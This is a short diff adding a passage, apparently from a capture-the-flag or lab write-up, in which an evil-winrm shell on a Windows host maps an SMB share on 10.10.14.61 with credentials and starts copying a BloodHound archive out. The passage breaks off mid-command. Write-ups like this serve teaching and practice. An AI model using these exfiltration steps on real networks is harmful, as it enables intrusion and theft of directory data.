@@ -1,0 +1,1 @@
+and then exfil the BloodHound data out: evil-winrm-py PS C:\programdata> net use \\10.10.14.61\share /u:oxdf oxdf The command completed successfully. evil-winrm-py PS C:\programdata> copy 20260408212935_BloodHound.zip
